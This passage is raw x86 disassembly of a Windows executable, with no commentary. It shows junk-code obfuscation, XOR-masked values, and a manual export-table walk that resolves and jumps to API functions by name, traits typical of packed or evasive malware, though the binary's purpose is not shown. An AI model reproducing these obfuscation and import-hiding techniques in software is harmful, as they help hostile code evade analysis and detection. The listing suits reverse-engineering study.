  4218a1:	mov    esi,DWORD PTR [ebp-0x124]
  4218a7:	or     edx,esi
  4218a9:	add    edx,0x7a25
  4218af:	imul   edx,edx,0x28d2
  4218b5:	mov    esi,DWORD PTR [ebp-0x58]
  4218b8:	xor    edx,esi
  4218ba:	xor    edx,0x1856f731
  4218c0:	mov    esi,DWORD PTR [ebp-0xe8]
  4218c6:	mov    eax,DWORD PTR [esi+eax*1-0x3fb8fdc]
  4218cd:	add    eax,ecx
  4218cf:	add    edx,eax
  4218d1:	mov    DWORD PTR [ebp-0xac],edx
  4218d7:	mov    DWORD PTR [ebp-0x54],0x1
  4218de:	mov    DWORD PTR [ebp-0x40],0x1ee8
  4218e5:	mov    DWORD PTR [ebp-0x1c],0x64d8
  4218ec:	mov    DWORD PTR [ebp-0xf0],0x5a06
  4218f6:	mov    DWORD PTR [ebp-0x108],0x2eeb
  421900:	mov    DWORD PTR [ebp-0x104],0x2108
  42190a:	mov    eax,DWORD PTR [ebp-0x1c]
  42190d:	xor    edx,edx
  42190f:	push   0x3
  421911:	pop    ecx
  421912:	div    ecx
  421914:	mov    ecx,DWORD PTR [ebp-0x40]
  421917:	or     eax,ecx
  421919:	mov    ecx,DWORD PTR [ebp-0x54]
  42191c:	xor    edx,edx
  42191e:	div    ecx
  421920:	imul   eax,eax,0x7d53
  421926:	mov    ecx,DWORD PTR [ebp+0x8]
  421929:	lea    eax,[ecx+eax*1-0x1f534807]
  421930:	mov    ecx,DWORD PTR [ebp-0xf0]
  421936:	and    ecx,0x4108
  42193c:	and    ecx,0x40e7
  421942:	sub    ecx,0x1a54
  421948:	xor    ecx,0x25ac
  42194e:	mov    edx,DWORD PTR [ebp-0x104]
  421954:	xor    edx,0x6dda
  42195a:	mov    esi,DWORD PTR [ebp-0x108]
  421960:	and    edx,esi
  421962:	and    edx,0xe0c
  421968:	or     edx,0x5b
  42196b:	mov    esi,DWORD PTR [ebp-0xe8]
  421971:	mov    ecx,DWORD PTR [esi+ecx*1+0x1c]
  421975:	add    ecx,eax
  421977:	lea    eax,[edx+ecx*1-0xc5b]
  42197e:	mov    DWORD PTR [ebp-0xa8],eax
  421984:	and    DWORD PTR [ebp-0x144],0x0
  42198b:	jmp    0x42199d
  421990:	mov    eax,DWORD PTR [ebp-0x144]
  421996:	inc    eax
  421997:	mov    DWORD PTR [ebp-0x144],eax
  42199d:	mov    eax,DWORD PTR [ebp-0xe8]
  4219a3:	mov    ecx,DWORD PTR [ebp-0x144]
  4219a9:	cmp    ecx,DWORD PTR [eax+0x18]
  4219ac:	je     0x421f65
  4219b2:	mov    eax,DWORD PTR [ebp-0x144]
  4219b8:	mov    ecx,DWORD PTR [ebp-0x38]
  4219bb:	mov    edx,DWORD PTR [ebp+0x8]
  4219be:	add    edx,DWORD PTR [ecx+eax*4]
  4219c1:	mov    DWORD PTR [ebp-0x48],edx
  4219c4:	mov    eax,DWORD PTR [ebp-0x48]
  4219c7:	mov    DWORD PTR [ebp-0x210],eax
  4219cd:	mov    eax,DWORD PTR [ebp+0xc]
  4219d0:	mov    DWORD PTR [ebp-0x20c],eax
  4219d6:	mov    DWORD PTR [ebp-0x1f0],0xca79a575
  4219e0:	mov    DWORD PTR [ebp-0x1ec],0x9c1b89e8
  4219ea:	mov    DWORD PTR [ebp-0x1e0],0xca79a571
  4219f4:	mov    DWORD PTR [ebp-0x1dc],0x9c1b89e8
  4219fe:	lea    eax,[ebp-0x1e8]
  421a04:	mov    DWORD PTR [ebp-0x1f4],eax
  421a0a:	mov    eax,DWORD PTR [ebp-0x20c]
  421a10:	movzx  eax,WORD PTR [eax+0x20]
  421a14:	xor    eax,0xa49b
  421a19:	movzx  eax,ax
  421a1c:	sar    eax,1
  421a1e:	mov    ecx,DWORD PTR [ebp-0x20c]
  421a24:	movzx  ecx,WORD PTR [ecx+0x20]
  421a28:	xor    ecx,0xa49b
  421a2e:	movzx  ecx,cx
  421a31:	shl    ecx,0xf
  421a34:	or     eax,ecx
  421a36:	movzx  eax,ax
  421a39:	mov    ecx,DWORD PTR [ebp-0x1f4]
  421a3f:	mov    DWORD PTR [ecx],eax
  421a41:	mov    eax,DWORD PTR [ebp-0x1e0]
  421a47:	mov    edx,DWORD PTR [ebp-0x1dc]
  421a4d:	xor    eax,0xca79a575
  421a52:	xor    edx,0x9c1b89e8
  421a58:	mov    cl,0x2
  421a5a:	call   0x40a9b5
  421a5f:	mov    ebx,eax
  421a61:	mov    esi,edx
  421a63:	mov    eax,DWORD PTR [ebp-0x1e0]
  421a69:	mov    edx,DWORD PTR [ebp-0x1dc]
  421a6f:	xor    eax,0xca79a575
  421a74:	xor    edx,0x9c1b89e8
  421a7a:	mov    cl,0x3e
  421a7c:	call   0x4221f9
  421a81:	or     ebx,eax
  421a83:	or     esi,edx
  421a85:	movzx  eax,bl
  421a88:	push   eax
  421a89:	lea    eax,[ebp-0x198]
  421a8f:	push   eax
  421a90:	call   0x416c9e
  421a95:	mov    eax,DWORD PTR [ebp-0x1f0]
  421a9b:	mov    edx,DWORD PTR [ebp-0x1ec]
  421aa1:	xor    eax,0xca79a575
  421aa6:	xor    edx,0x9c1b89e8
  421aac:	mov    cl,0x2
  421aae:	call   0x40a9b5
  421ab3:	mov    esi,eax
  421ab5:	mov    edi,edx
  421ab7:	mov    eax,DWORD PTR [ebp-0x1f0]
  421abd:	mov    edx,DWORD PTR [ebp-0x1ec]
  421ac3:	xor    eax,0xca79a575
  421ac8:	xor    edx,0x9c1b89e8
  421ace:	mov    cl,0x3e
  421ad0:	call   0x4221f9
  421ad5:	or     esi,eax
  421ad7:	or     edi,edx
  421ad9:	mov    DWORD PTR [ebp-0x1f8],esi
  421adf:	jmp    0x421b34
  421ae4:	mov    eax,DWORD PTR [ebp-0x1e0]
  421aea:	mov    edx,DWORD PTR [ebp-0x1dc]
  421af0:	xor    eax,0xca79a575
  421af5:	xor    edx,0x9c1b89e8
  421afb:	mov    cl,0x2
  421afd:	call   0x40a9b5
  421b02:	mov    esi,eax
  421b04:	mov    edi,edx
  421b06:	mov    eax,DWORD PTR [ebp-0x1e0]
  421b0c:	mov    edx,DWORD PTR [ebp-0x1dc]
  421b12:	xor    eax,0xca79a575
  421b17:	xor    edx,0x9c1b89e8
  421b1d:	mov    cl,0x3e
  421b1f:	call   0x4221f9
  421b24:	or     esi,eax
  421b26:	or     edi,edx
  421b28:	add    esi,DWORD PTR [ebp-0x1f8]
  421b2e:	mov    DWORD PTR [ebp-0x1f8],esi
  421b34:	mov    eax,DWORD PTR [ebp-0x1e8]
  421b3a:	cmp    DWORD PTR [ebp-0x1f8],eax
  421b40:	je     0x421bd3
  421b46:	mov    eax,DWORD PTR [ebp-0x1f8]
  421b4c:	mov    ecx,DWORD PTR [ebp-0x20c]
  421b52:	movzx  eax,WORD PTR [ecx+eax*4+0x2]
  421b57:	xor    eax,0xa49b
  421b5c:	movzx  eax,ax
  421b5f:	sar    eax,1
  421b61:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421b67:	mov    edx,DWORD PTR [ebp-0x20c]
  421b6d:	movzx  ecx,WORD PTR [edx+ecx*4+0x2]
  421b72:	xor    ecx,0xa49b
  421b78:	movzx  ecx,cx
  421b7b:	shl    ecx,0xf
  421b7e:	or     eax,ecx
  421b80:	movzx  eax,ax
  421b83:	mov    DWORD PTR [ebp-0x1fc],eax
  421b89:	mov    eax,DWORD PTR [ebp-0x1f8]
  421b8f:	mov    ecx,DWORD PTR [ebp-0x20c]
  421b95:	movzx  eax,WORD PTR [ecx+eax*4]
  421b99:	xor    eax,0xa49b
  421b9e:	movzx  eax,ax
  421ba1:	sar    eax,1
  421ba3:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421ba9:	mov    edx,DWORD PTR [ebp-0x20c]
  421baf:	movzx  ecx,WORD PTR [edx+ecx*4]
  421bb3:	xor    ecx,0xa49b
  421bb9:	movzx  ecx,cx
  421bbc:	shl    ecx,0xf
  421bbf:	or     eax,ecx
  421bc1:	mov    ecx,DWORD PTR [ebp-0x1fc]
  421bc7:	mov    BYTE PTR [ebp+ecx*1-0x198],al
  421bce:	jmp    0x421ae4
  421bd3:	mov    eax,DWORD PTR [ebp-0x1f0]
  421bd9:	mov    edx,DWORD PTR [ebp-0x1ec]
  421bdf:	xor    eax,0xca79a575
  421be4:	xor    edx,0x9c1b89e8
  421bea:	mov    cl,0x2
  421bec:	call   0x40a9b5
  421bf1:	mov    esi,eax
  421bf3:	mov    edi,edx
  421bf5:	mov    eax,DWORD PTR [ebp-0x1f0]
  421bfb:	mov    edx,DWORD PTR [ebp-0x1ec]
  421c01:	xor    eax,0xca79a575
  421c06:	xor    edx,0x9c1b89e8
  421c0c:	mov    cl,0x3e
  421c0e:	call   0x4221f9
  421c13:	or     esi,eax
  421c15:	or     edi,edx
  421c17:	mov    DWORD PTR [ebp-0x1e4],esi
  421c1d:	mov    eax,DWORD PTR [ebp-0x1e0]
  421c23:	mov    edx,DWORD PTR [ebp-0x1dc]
  421c29:	xor    eax,0xca79a575
  421c2e:	xor    edx,0x9c1b89e8
  421c34:	mov    cl,0x2
  421c36:	call   0x40a9b5
  421c3b:	mov    esi,eax
  421c3d:	mov    edi,edx
  421c3f:	mov    eax,DWORD PTR [ebp-0x1e0]
  421c45:	mov    edx,DWORD PTR [ebp-0x1dc]
  421c4b:	xor    eax,0xca79a575
  421c50:	xor    edx,0x9c1b89e8
  421c56:	mov    cl,0x3e
  421c58:	call   0x4221f9
  421c5d:	or     esi,eax
  421c5f:	or     edi,edx
  421c61:	mov    DWORD PTR [ebp-0x23c],esi
  421c67:	mov    DWORD PTR [ebp-0x238],edi
  421c6d:	mov    eax,DWORD PTR [ebp-0x23c]
  421c73:	or     eax,DWORD PTR [ebp-0x238]
  421c79:	je     0x421ed9
  421c7f:	lea    eax,[ebp-0x204]
  421c85:	mov    DWORD PTR [ebp-0x208],eax
  421c8b:	mov    eax,DWORD PTR [ebp-0x1e4]
  421c91:	xor    edx,edx
  421c93:	mov    cl,0x2
  421c95:	call   0x4221f9
  421c9a:	mov    esi,eax
  421c9c:	mov    edi,edx
  421c9e:	mov    eax,DWORD PTR [ebp-0x1e4]
  421ca4:	xor    edx,edx
  421ca6:	mov    cl,0x3e
  421ca8:	call   0x40a9b5
  421cad:	or     esi,eax
  421caf:	or     edi,edx
  421cb1:	xor    esi,0xca79a575
  421cb7:	xor    edi,0x9c1b89e8
  421cbd:	mov    eax,DWORD PTR [ebp-0x208]
  421cc3:	mov    DWORD PTR [eax],esi
  421cc5:	mov    DWORD PTR [eax+0x4],edi
  421cc8:	mov    eax,DWORD PTR [ebp-0x1e4]
  421cce:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421cd6:	mov    eax,DWORD PTR [ebp-0x1e0]
  421cdc:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ce2:	xor    eax,0xca79a575
  421ce7:	xor    edx,0x9c1b89e8
  421ced:	mov    cl,0x2
  421cef:	call   0x40a9b5
  421cf4:	mov    ebx,eax
  421cf6:	mov    edi,edx
  421cf8:	mov    eax,DWORD PTR [ebp-0x1e0]
  421cfe:	mov    edx,DWORD PTR [ebp-0x1dc]
  421d04:	xor    eax,0xca79a575
  421d09:	xor    edx,0x9c1b89e8
  421d0f:	mov    cl,0x3e
  421d11:	call   0x4221f9
  421d16:	or     ebx,eax
  421d18:	or     edi,edx
  421d1a:	movsx  eax,bl
  421d1d:	cmp    esi,eax
  421d1f:	je     0x421e7f
  421d25:	mov    eax,DWORD PTR [ebp-0x1e4]
  421d2b:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421d33:	mov    eax,DWORD PTR [ebp-0x204]
  421d39:	mov    edx,DWORD PTR [ebp-0x200]
  421d3f:	xor    eax,0xca79a575
  421d44:	xor    edx,0x9c1b89e8
  421d4a:	mov    cl,0x2
  421d4c:	call   0x40a9b5
  421d51:	mov    edi,eax
  421d53:	mov    ebx,edx
  421d55:	mov    eax,DWORD PTR [ebp-0x204]
  421d5b:	mov    edx,DWORD PTR [ebp-0x200]
  421d61:	xor    eax,0xca79a575
  421d66:	xor    edx,0x9c1b89e8
  421d6c:	mov    cl,0x3e
  421d6e:	call   0x4221f9
  421d73:	or     edi,eax
  421d75:	or     ebx,edx
  421d77:	mov    eax,DWORD PTR [ebp-0x210]
  421d7d:	movsx  eax,BYTE PTR [eax+edi*1]
  421d81:	cmp    esi,eax
  421d83:	je     0x421d93
  421d89:	jmp    0x421ed9
  421d8e:	jmp    0x421e7f
  421d93:	mov    eax,DWORD PTR [ebp-0x204]
  421d99:	mov    edx,DWORD PTR [ebp-0x200]
  421d9f:	xor    eax,0xca79a575
  421da4:	xor    edx,0x9c1b89e8
  421daa:	mov    cl,0x2
  421dac:	call   0x40a9b5
  421db1:	mov    esi,eax
  421db3:	mov    edi,edx
  421db5:	mov    eax,DWORD PTR [ebp-0x204]
  421dbb:	mov    edx,DWORD PTR [ebp-0x200]
  421dc1:	xor    eax,0xca79a575
  421dc6:	xor    edx,0x9c1b89e8
  421dcc:	mov    cl,0x3e
  421dce:	call   0x4221f9
  421dd3:	or     esi,eax
  421dd5:	or     edi,edx
  421dd7:	mov    eax,DWORD PTR [ebp-0x210]
  421ddd:	movsx  esi,BYTE PTR [eax+esi*1]
  421de1:	mov    eax,DWORD PTR [ebp-0x1f0]
  421de7:	mov    edx,DWORD PTR [ebp-0x1ec]
  421ded:	xor    eax,0xca79a575
  421df2:	xor    edx,0x9c1b89e8
  421df8:	mov    cl,0x2
  421dfa:	call   0x40a9b5
  421dff:	mov    ebx,eax
  421e01:	mov    edi,edx
  421e03:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e09:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e0f:	xor    eax,0xca79a575
  421e14:	xor    edx,0x9c1b89e8
  421e1a:	mov    cl,0x3e
  421e1c:	call   0x4221f9
  421e21:	or     ebx,eax
  421e23:	or     edi,edx
  421e25:	movsx  eax,bl
  421e28:	cmp    esi,eax
  421e2a:	jne    0x421e7f
  421e30:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e36:	mov    edx,DWORD PTR [ebp-0x1dc]
  421e3c:	xor    eax,0xca79a575
  421e41:	xor    edx,0x9c1b89e8
  421e47:	mov    cl,0x2
  421e49:	call   0x40a9b5
  421e4e:	mov    esi,eax
  421e50:	mov    edi,edx
  421e52:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e58:	mov    edx,DWORD PTR [ebp-0x1dc]
  421e5e:	xor    eax,0xca79a575
  421e63:	xor    edx,0x9c1b89e8
  421e69:	mov    cl,0x3e
  421e6b:	call   0x4221f9
  421e70:	or     esi,eax
  421e72:	or     edi,edx
  421e74:	mov    DWORD PTR [ebp-0x214],esi
  421e7a:	jmp    0x421f23
  421e7f:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e85:	mov    edx,DWORD PTR [ebp-0x1dc]
  421e8b:	xor    eax,0xca79a575
  421e90:	xor    edx,0x9c1b89e8
  421e96:	mov    cl,0x2
  421e98:	call   0x40a9b5
  421e9d:	mov    esi,eax
  421e9f:	mov    edi,edx
  421ea1:	mov    eax,DWORD PTR [ebp-0x1e0]
  421ea7:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ead:	xor    eax,0xca79a575
  421eb2:	xor    edx,0x9c1b89e8
  421eb8:	mov    cl,0x3e
  421eba:	call   0x4221f9
  421ebf:	or     esi,eax
  421ec1:	or     edi,edx
  421ec3:	add    esi,DWORD PTR [ebp-0x1e4]
  421ec9:	mov    DWORD PTR [ebp-0x1e4],esi
  421ecf:	jmp    0x421c1d
  421ed4:	jmp    0x421c1d
  421ed9:	mov    eax,DWORD PTR [ebp-0x1f0]
  421edf:	mov    edx,DWORD PTR [ebp-0x1ec]
  421ee5:	xor    eax,0xca79a575
  421eea:	xor    edx,0x9c1b89e8
  421ef0:	mov    cl,0x2
  421ef2:	call   0x40a9b5
  421ef7:	mov    esi,eax
  421ef9:	mov    edi,edx
  421efb:	mov    eax,DWORD PTR [ebp-0x1f0]
  421f01:	mov    edx,DWORD PTR [ebp-0x1ec]
  421f07:	xor    eax,0xca79a575
  421f0c:	xor    edx,0x9c1b89e8
  421f12:	mov    cl,0x3e
  421f14:	call   0x4221f9
  421f19:	or     esi,eax
  421f1b:	or     edi,edx
  421f1d:	mov    DWORD PTR [ebp-0x214],esi
  421f23:	mov    eax,DWORD PTR [ebp-0x214]
  421f29:	mov    DWORD PTR [ebp-0xc8],eax
  421f2f:	cmp    DWORD PTR [ebp-0xc8],0x0
  421f36:	je     0x421f60
  421f3c:	mov    eax,DWORD PTR [ebp-0x144]
  421f42:	mov    ecx,DWORD PTR [ebp-0xac]
  421f48:	movzx  eax,WORD PTR [ecx+eax*2]
  421f4c:	mov    ecx,DWORD PTR [ebp-0xa8]
  421f52:	mov    eax,DWORD PTR [ecx+eax*4]
  421f55:	mov    DWORD PTR [ebp-0xfc],eax
  421f5b:	jmp    0x421f65
  421f60:	jmp    0x421990
  421f65:	cmp    DWORD PTR [ebp-0xfc],0x0
  421f6c:	jne    0x421f79
  421f72:	xor    eax,eax
  421f74:	jmp    0x4221f2
  421f79:	mov    eax,DWORD PTR [ebp+0x8]
  421f7c:	add    eax,DWORD PTR [ebp-0xfc]
  421f82:	mov    DWORD PTR [ebp-0xec],eax
  421f88:	mov    DWORD PTR [ebp-0x74],0x0
  421f8f:	cmp    DWORD PTR [ebp-0xb0],0x0
  421f96:	je     0x422012
  421f9c:	cmp    DWORD PTR [ebp-0xb0],0x0
  421fa3:	je     0x422012
  421fa9:	mov    eax,DWORD PTR [ebp-0xb0]
  421faf:	shl    eax,0x2
  421fb2:	mov    DWORD PTR [ebp-0x74],eax
  421fb5:	mov    DWORD PTR [ebp-0x14c],0x0
  421fbf:	sub    esp,DWORD PTR [ebp-0x74]
  421fc2:	mov    DWORD PTR [ebp-0x14c],esp
  421fc8:	mov    DWORD PTR [ebp-0x148],0x0
  421fd2:	mov    eax,DWORD PTR [ebp-0x148]
  421fd8:	cmp    eax,DWORD PTR [ebp-0xb0]
  421fde:	je     0x422012
  421fe4:	mov    eax,DWORD PTR [ebp-0x148]
  421fea:	mov    ecx,DWORD PTR [ebp-0x14c]
  421ff0:	mov    edx,DWORD PTR [ebp-0x148]
  421ff6:	mov    esi,DWORD PTR [ebp+0x14]
  421ff9:	mov    edx,DWORD PTR [esi+edx*4+0x4]
  421ffd:	mov    DWORD PTR [ecx+eax*4],edx
  422000:	mov    eax,DWORD PTR [ebp-0x148]
  422006:	inc    eax
  422007:	mov    DWORD PTR [ebp-0x148],eax
  42200d:	jmp    0x421fd2
  422012:	mov    DWORD PTR [ebp-0x9c],0x0
  42201c:	push   0x4221ab
  422021:	jmp    DWORD PTR [ebp-0xec]
  422027:	mov    eax,eax
  422029:	mov    ecx,esp
  42202b:	ret    0xc
  42202e:	cmp    DWORD PTR ds:0x4282bf,0x0
  422035:	mov    DWORD PTR ds:0x4282bb,0x7476
  42203f:	mov    DWORD PTR ds:0x428137,0x1cdc
  422049:	mov    DWORD PTR ds:0x4282bb,0x65fa
  422053:	mov    DWORD PTR ds:0x428127,0x5dca
  42205d:	jmp    0x4220a7
  422062:	mov    eax,ds:0x4282b7
  422067:	cmp    DWORD PTR ds:0x4282bf,0x0
  42206e:	jbe    0x42208f
  422074:	push   0x24f1
  422079:	call   DWORD PTR ds:0x428d38
  42207f:	inc    DWORD PTR ds:0x428363
  422085:	sub    DWORD PTR ds:0x428143,0x46d9
  42208f:	inc    DWORD PTR ds:0x4282bf
  422095:	adc    DWORD PTR ds:0x4282cb,ebx
  42209b:	or     DWORD PTR ds:0x4281f3,0x4029
  4220a5:	not    eax
  4220a7:	push   ebx
  4220a8:	push   esi
  4220a9:	sbb    DWORD PTR ds:0x42834f,edx
  4220af:	mov    eax,DWORD PTR [esp+0x18]
  4220b3:	or     eax,eax
  4220b5:	jne    0x4220e5
  4220bb:	mov    ecx,DWORD PTR [esp+0x14]
  4220bf:	mov    eax,DWORD PTR [esp+0x10]
  4220c3:	xor    edx,edx
  4220c5:	div    ecx
  4220c7:	xor    DWORD PTR ds:0x42814f,0x45f1
  4220d1:	mov    ebx,eax
  4220d3:	mov    eax,DWORD PTR [esp+0xc]
  4220d7:	div    ecx
  4220d9:	mov    edx,0x36e3
  4220de:	mov    edx,ebx
  4220e0:	jmp    0x4221a6
  4220e5:	mov    ecx,eax
  4220e7:	sbb    eax,0x67a9
  4220ec:	mov    ebx,DWORD PTR [esp+0x14]
  4220f0:	cmp    DWORD PTR ds:0x4282b7,0x0
  4220f7:	mov    edx,DWORD PTR ds:0x428367
  4220fd:	mov    DWORD PTR ds:0x4282e7,0x4bc7
  422107:	mov    edx,DWORD PTR ds:0x4282cf
  42210d:	jmp    0x422157
  422112:	mov    DWORD PTR ds:0x428217,0x15f
  42211c:	mov    DWORD PTR ds:0x42824f,0x4dd1
  422126:	cmp    DWORD PTR ds:0x4282b7,0x0
  42212d:	jle    0x42214a
  422133:	push   0x824e
  422138:	call   DWORD PTR ds:0x428d3c
  42213e:	xor    DWORD PTR ds:0x4282cf,0x6c44
  422148:	sub    edx,edx
  42214a:	sbb    DWORD PTR ds:0x428217,0x445e
  422154:	dec    edx
  422155:	not    edx
  422157:	mov    edx,DWORD PTR [esp+0x10]
  42215b:	mov    eax,DWORD PTR [esp+0xc]
  42215f:	shr    ecx,1
  422161:	rcr    ebx,1
  422163:	shr    edx,1
  422165:	rcr    eax,1
  422167:	or     ecx,ecx
  422169:	jne    0x42215f
  42216f:	div    ebx
  422171:	mov    esi,eax
  422173:	mul    DWORD PTR [esp+0x18]
  422177:	mov    ecx,eax
  422179:	mov    eax,DWORD PTR [esp+0x14]
  42217d:	mul    esi
  42217f:	add    edx,ecx
  422181:	jb     0x4221a1
  422187:	cmp    edx,DWORD PTR [esp+0x10]
  42218b:	ja     0x4221a1
  422191:	jb     0x4221a2
  422197:	cmp    eax,DWORD PTR [esp+0xc]
  42219b:	jbe    0x4221a2
  4221a1:	dec    esi
  4221a2:	xor    edx,edx
  4221a4:	mov    eax,esi
  4221a6:	pop    esi
  4221a7:	pop    ebx
  4221a8:	ret    0x10
  4221ab:	or     DWORD PTR ds:0x428333,0x42833f
  4221b5:	sub    DWORD PTR [ebp+0x10],0x1
  4221b9:	mov    DWORD PTR ds:0x42813b,0x43bf
  4221c3:	cmp    DWORD PTR [ebp+0x10],0x0
  4221c7:	mov    DWORD PTR ds:0x42832b,0x612a
  4221d1:	je     0x4221e0
  4221d7:	xor    DWORD PTR ds:0x428127,edx
  4221dd:	add    esp,DWORD PTR [ebp-0x74]
  4221e0:	mov    DWORD PTR [ebp-0x9c],eax
  4221e6:	mov    DWORD PTR ds:0x42822f,ebx
  4221ec:	mov    eax,DWORD PTR [ebp-0x9c]
  4221f2:	pop    edi
  4221f3:	pop    esi
  4221f4:	pop    ebx
  4221f5:	leave  
  4221f6:	ret    0x10
  4221f9:	cmp    cl,0x40
  4221fc:	mov    DWORD PTR ds:0x428213,0x43a8
  422206:	jae    0x422258
  42220c:	mov    DWORD PTR ds:0x428147,0x42f2
  422216:	cmp    cl,0x20
  422219:	mov    DWORD PTR ds:0x42812f,0x3d58
  422223:	jae    0x422243
  422229:	or     DWORD PTR ds:0x428123,0x5e1e
  422233:	shld   edx,eax,cl
  422236:	mov    DWORD PTR ds:0x428247,0x1bd2
  422240:	shl    eax,cl
  422242:	ret    
  422243:	inc    edx
  422244:	mov    edx,eax
  422246:	sub    DWORD PTR ds:0x428363,0x4282bb
  422250:	xor    eax,eax
  422252:	and    cl,0x1f
  422255:	shl    edx,cl
  422257:	ret    
  422258:	xor    eax,eax
  42225a:	xor    edx,edx
  42225c:	ret    
  42225d:	add    BYTE PTR [eax],al
  42225f:	add    cl,ch
  422261:	cmp    ebp,DWORD PTR [ebx+0x14]
  422264:	cmp    al,0x26
  422266:	sub    al,0x44
  422268:	jno    0x4222d3
  42226a:	ja     0x4222d1
  42226c:	int3   
  42226d:	fsubr  QWORD PTR [edx+0x1e]
  422270:	jo     0x4222d7
  422272:	popa   
  422273:	ins    BYTE PTR es:[edi],dx
  422274:	push   eax
  422275:	lods   eax,DWORD PTR ds:[esi]
  422276:	xor    DWORD PTR [esi+0x41],edi
  422279:	ins    BYTE PTR es:[edi],dx
  42227a:	popa   
  42227b:	outs   dx,BYTE PTR ds:[esi]
  42227c:	add    BYTE PTR [eax],al
  42227e:	add    BYTE PTR [eax],al
  422280:	addr16 jb 0x4222e8
  422283:	popa   
  422284:	je     0x4222ed
  422286:	jb     0x4222ed
  422288:	popa   
  422289:	je     0x4222f2
  42228b:	jb     0x4222f2
  42228d:	popa   
  42228e:	je     0x4222f7
  422290:	jb     0x4222f7
  422292:	popa   
  422293:	je     0x4222fc
  422295:	jb     0x4222fc
  422297:	popa   
  422298:	je     0x422301
  42229a:	jb     0x422301
  42229c:	popa   
  42229d:	je     0x422306
  42229f:	jb     0x422306
  4222a1:	popa   
  4222a2:	je     0x42230b
  4222a4:	jb     0x42230b
  4222a6:	popa   
  4222a7:	je     0x422310
  4222a9:	jb     0x422310
  4222ab:	popa   
  4222ac:	je     0x422315
  4222ae:	jb     0x422315
  4222b0:	popa   
  4222b1:	je     0x4222b3
  4222b3:	add    BYTE PTR [eax+0x65],ch
  4222b6:	ins    BYTE PTR es:[edi],dx
  4222b7:	ins    BYTE PTR es:[edi],dx
  4222b8:	push   0x686c6c65
  4222bd:	gs ins BYTE PTR es:[edi],dx
  4222bf:	ins    BYTE PTR es:[edi],dx
  4222c0:	push   0x686c6c65
  4222c5:	gs ins BYTE PTR es:[edi],dx
  4222c7:	ins    BYTE PTR es:[edi],dx
  4222c8:	push   0x686c6c65
  4222cd:	gs ins BYTE PTR es:[edi],dx
  4222cf:	ins    BYTE PTR es:[edi],dx
  4222d0:	push   0x686c6c65
  4222d5:	gs ins BYTE PTR es:[edi],dx
  4222d7:	ins    BYTE PTR es:[edi],dx
  4222d8:	push   0x686c6c65
  4222dd:	gs ins BYTE PTR es:[edi],dx
  4222df:	ins    BYTE PTR es:[edi],dx
  4222e0:	push   0x686c6c65
  4222e5:	gs ins BYTE PTR es:[edi],dx
  4222e7:	ins    BYTE PTR es:[edi],dx
  4222e8:	add    BYTE PTR [eax],al
  4222ea:	add    BYTE PTR [eax],al
  4222ec:	outs   dx,DWORD PTR ds:[esi]
  4222ed:	add    BYTE PTR [eax+eax*1+0x65],ch
  4222f1:	add    BYTE PTR [ecx+0x0],ah
  4222f4:	jne    0x4222f6
  4222f6:	je     0x4222f8
  4222f8:	xor    eax,DWORD PTR [eax]
  4222fa:	xor    al,BYTE PTR [eax]
  4222fc:	add    BYTE PTR [eax],al
  4222fe:	add    BYTE PTR [eax],al
  422300:	push   0x61006500
  422305:	add    BYTE PTR [esi+0x0],dh
  422308:	add    BYTE PTR gs:[esi+0x0],ch
  42230c:	push   0x61006500
  422311:	add    BYTE PTR [esi+0x0],dh
  422314:	add    BYTE PTR gs:[esi+0x0],ch
  422318:	push   0x61006500
  42231d:	add    BYTE PTR [esi+0x0],dh
  422320:	add    BYTE PTR gs:[esi+0x0],ch
  422324:	push   0x61006500
  422329:	add    BYTE PTR [esi+0x0],dh
  42232c:	add    BYTE PTR gs:[esi+0x0],ch
  422330:	push   0x61006500
  422335:	add    BYTE PTR [esi+0x0],dh
  422338:	add    BYTE PTR gs:[esi+0x0],ch
  42233c:	push   0x61006500
  422341:	add    BYTE PTR [esi+0x0],dh
  422344:	add    BYTE PTR gs:[esi+0x0],ch
  422348:	push   0x61006500
  42234d:	add    BYTE PTR [esi+0x0],dh
  422350:	add    BYTE PTR gs:[esi+0x0],ch
  422354:	push   0x61006500
  422359:	add    BYTE PTR [esi+0x0],dh
  42235c:	add    BYTE PTR gs:[esi+0x0],ch
  422360:	push   0x61006500
  422365:	add    BYTE PTR [esi+0x0],dh
  422368:	add    BYTE PTR gs:[esi+0x0],ch
  42236c:	add    BYTE PTR [eax],al
  42236e:	add    BYTE PTR [eax],al
  422370:	in     al,dx
  422371:	and    al,BYTE PTR [edx+0x0]
  422374:	dec    edi
  422375:	ins    BYTE PTR es:[edi],dx
  422376:	gs dec ecx
  422378:	arpl   WORD PTR [edi+0x6e],bp
  42237b:	push   esp
  42237c:	outs   dx,DWORD PTR ds:[esi]
  42237d:	inc    ebx
  42237e:	jne    0x4223f2
  422380:	jae    0x4223f1
  422382:	jb     0x422384
  422384:	je     0x4223a9
  422386:	inc    edx
	...
  42238f:	add    BYTE PTR [eax],dh
  422391:	daa    
  422392:	inc    edx
  422393:	add    BYTE PTR [eax],bh
  422395:	daa    
  422396:	inc    edx
  422397:	add    al,dh
  422399:	and    eax,0x43f20042
  42239e:	push   ebx
  42239f:	mov    WORD PTR ds:0x1a49ba4,ss
  4223a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223a6:	popf   
  4223a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223a8:	jno    0x42234e
  4223aa:	xchg   edi,eax
  4223ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223ac:	or     esp,DWORD PTR [ecx+ecx*4-0x7c5bac5c]
  4223b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223b4:	sbb    DWORD PTR [ebp+eax*4-0x445b645c],esp
  4223bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223bc:	rol    DWORD PTR [edx-0x5b6a732f],cl
  4223c2:	adc    eax,0x1a49ba4
  4223c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223c8:	popf   
  4223c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223ca:	jno    0x422370
